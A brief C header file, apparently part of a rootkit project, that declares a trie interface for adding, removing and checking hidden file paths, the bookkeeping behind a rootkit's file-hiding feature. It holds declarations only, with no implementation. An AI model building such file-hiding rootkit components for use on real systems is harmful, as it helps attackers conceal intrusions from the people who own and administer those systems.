//
// Created by idan on 1/14/24.
//

#ifndef ROOTKIT_HIDDEN_FILES_TRIE_H
#define ROOTKIT_HIDDEN_FILES_TRIE_H

#include "chars_trie.h"

void initialize_trie(void);

struct node* get_hidden_paths_root_node(void);
void add_hidden_path(const char*);
void remove_hidden_path(const char*);
int is_path_hidden(const char *);
int is_path_arr_hidden(const char *path[], int len);

void finish_trie(void);

#endif //ROOTKIT_HIDDEN_FILES_TRIE_H
